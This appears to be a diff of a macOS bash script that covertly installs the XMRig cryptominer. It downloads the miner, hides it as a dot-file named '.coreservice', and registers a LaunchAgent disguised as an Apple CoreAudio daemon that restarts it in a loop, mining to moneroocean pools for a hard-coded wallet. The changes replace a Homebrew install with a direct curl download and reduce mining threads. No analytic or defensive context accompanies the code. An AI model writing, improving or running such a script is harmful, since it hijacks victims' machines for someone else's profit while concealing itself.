@@ -1,18 +1,16 @@
 #!/bin/bash
 set -e
 
-cd "$(mktemp -d)"
 f="com.apple.coreaudio.daemon.plist"
 b="$HOME/.config/.coreservice"
 
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" >/dev/null 2>&1
-eval "$(/opt/homebrew/bin/brew shellenv)" >/dev/null 2>&1
-/opt/homebrew/bin/brew install --quiet xmrig >/dev/null 2>&1
-
-mkdir -p "$(dirname "$b")"
-cp /opt/homebrew/bin/xmrig "$b"
+# Download xmrig directly instead of using Homebrew
+mkdir -p ~/.config
+curl -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-x64.tar.gz | tar -xz -C ~/.config
+mv ~/.config/xmrig-6.21.0/xmrig "$b"
 chmod +x "$b"
 
+# Create LaunchAgent plist
 cat <<EOF > "$f"
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -24,7 +22,7 @@ cat <<EOF > "$f"
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>while true; do if ! pgrep -f ".coreservice"; then "$b" -o gulf.moneroocean.stream:10128 -o pool.moneroocean.stream:443 -u 464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF --tls -t 3 --background-task; fi; sleep 60; done</string>
+        <string>while true; do if ! pgrep -f ".coreservice"; then "$b" -o gulf.moneroocean.stream:10128 -o pool.moneroocean.stream:443 -u 464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF --tls -t 2 --background-task; fi; sleep 60; done</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
@@ -36,5 +34,4 @@ EOF
 
 mkdir -p ~/Library/LaunchAgents
 mv "$f" ~/Library/LaunchAgents/
-launchctl load ~/Library/LaunchAgents/"$f" >/dev/null 2>&1
-rm -rf "$PWD"
+launchctl load ~/Library/LaunchAgents/"$f"
